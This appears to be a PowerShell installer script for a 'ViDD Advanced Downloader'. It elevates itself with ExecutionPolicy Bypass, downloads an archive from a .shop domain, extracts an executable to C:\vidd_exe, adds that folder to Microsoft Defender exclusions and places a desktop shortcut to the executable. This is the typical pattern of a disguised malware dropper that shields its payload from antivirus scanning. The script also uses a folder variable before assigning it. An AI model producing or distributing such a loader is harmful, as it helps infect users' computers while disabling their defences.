# ========================================
# ViDD Advanced Downloader Installer Script
# ========================================
# Relaunch in interactive PowerShell if run via pipe
if ($Host.Name -ne 'ConsoleHost') {
    Start-Process powershell -ArgumentList "-NoExit", "-ExecutionPolicy Bypass", "-File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Check for admin
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator"))
{
    Write-Host "Please run this script as Administrator."
    exit
}

# =========================
# Remove old folder if exists
# =========================
if (Test-Path $extractFolder) {
    Write-Host "Removing old installation folder..."
    Remove-Item -Path $extractFolder -Recurse -Force
}

$downloadURL = "https://www.qsrtools.shop/vidd_beta.zip"
$archiveFile = "$env:TEMP\vidd_beta.zip"
$extractFolder = "C:\vidd_exe"
$exeName = "ViDD.exe"
$shortcutName = "ViDD Downloader.lnk"

Write-Host "Downloading file..."
Invoke-WebRequest -Uri $downloadURL -OutFile $archiveFile -UseBasicParsing

Write-Host "Downloaded file size:"
(Get-Item $archiveFile).length

# Create extraction folder if it doesn't exist
If (!(Test-Path $extractFolder)) {
    New-Item -ItemType Directory -Path $extractFolder | Out-Null
}

# Check header
$headerBytes = Get-Content -Path $archiveFile -Encoding Byte -TotalCount 4
$header = ($headerBytes | ForEach-Object { $_.ToString("X2") }) -join ""

Write-Host "File header: $header"

if ($header -eq "52617221") {
    Write-Host "Detected RAR archive."

    # Check WinRAR
    $winrar = "${env:ProgramFiles}\WinRAR\WinRAR.exe"
    if (!(Test-Path $winrar)) { $winrar = "${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe" }

    if (Test-Path $winrar) {
        & $winrar x -o+ $archiveFile "$extractFolder\"
    } else {
        Write-Host "WinRAR not found. Cannot extract RAR."
        exit
    }

} elseif ($header -eq "504B0304") {
    Write-Host "Detected ZIP archive."
    Try {
        Expand-Archive -Path $archiveFile -DestinationPath $extractFolder -Force -ErrorAction Stop
    }
    Catch {
        Write-Host "Extraction failed."
        exit
    }
} else {
    Write-Host "Unknown file type. Extraction aborted."
    exit
}

# Use extraction folder directly
$finalFolder = $extractFolder
Write-Host "Using final folder path: $finalFolder"

# Add to Defender exclusion
Write-Host "Adding folder to Defender exclusions..."
Add-MpPreference -ExclusionPath $finalFolder

# Create desktop shortcut directly to run.exe
Write-Host "Creating desktop shortcut..."
$WshShell = New-Object -ComObject WScript.Shell
$desktopPath = [Environment]::GetFolderPath("Desktop")
$shortcut = $WshShell.CreateShortcut("$desktopPath\$shortcutName")
$shortcut.TargetPath = "$finalFolder\$exeName"
$shortcut.WorkingDirectory = $finalFolder
$shortcut.IconLocation = "$finalFolder\$exeName"  # Keep original EXE icon
$shortcut.WindowStyle = 1  # Normal window
$shortcut.Save()

Write-Host "Done!"
if ($Host.Name -eq 'ConsoleHost') {
    Read-Host -Prompt "Press Enter to exit"
} else {
    Start-Sleep -Seconds 10
}
